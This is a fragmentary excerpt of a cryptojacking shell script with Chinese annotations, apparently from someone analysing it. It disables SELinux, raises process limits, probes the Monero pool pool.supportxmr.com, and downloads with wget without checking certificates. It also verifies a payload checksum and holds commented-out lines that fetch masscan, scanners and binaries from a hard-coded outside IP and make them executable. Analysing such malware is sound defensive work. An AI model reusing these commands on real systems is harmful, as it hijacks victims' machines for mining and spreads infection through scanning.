...
# 关闭防火墙并将消息导入/dev/null
setenforce 0 2>/dev/null
ulimit -u 50000
#sysctl 查看系统命令
#写入了vm.nr_hugepages = 6
...
# pool.supportxmr.com 下面返回1
if [ $(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ]; #1
then
        dns="" #V
else
        dns="-d"
...
if [ -s /usr/bin/wget ];
then
# don't validate the server's certificate 不验证服务器的证书 -O 写入到文件
...
# 校验X86_64  cd7ca50a01fc9c6e8fdc8c3d5e6100f0 
downloadIfNeed()
{
    if [ -x "$(command -v md5sum)" ]
    then
...
#			$WGET "$DIR"/masscan http://205.185.116.78/masscan
#			$WGET "$DIR"/p http://205.185.116.78/p
#			$WGET "$DIR"/hxx http://205.185.116.78/hxx
#			lwp-download http://205.185.116.78/masscan "$DIR"/masscan
#			lwp-download http://205.185.116.78/p "$DIR"/p
#			lwp-download http://205.185.116.78/hxx "$DIR"/hxx
#			chmod 777 "$DIR"/hxx
...
#		else
#			echo "xd" > /tmp/.checking
#			$WGET "$DIR"/scan http://205.185.116.78/scan
#			$WGET "$DIR"/p http://205.185.116.78/p
#			$WGET "$DIR"/hxx http://205.185.116.78/hxx
#			lwp-download http://205.185.116.78/scan "$DIR"/scan
#			lwp-download http://205.185.116.78/p "$DIR"/p
#			lwp-download http://205.185.116.78/hxx "$DIR"/hxx
#			chmod 777 "$DIR"/hxx
#			chmod 777 "$DIR"/scan
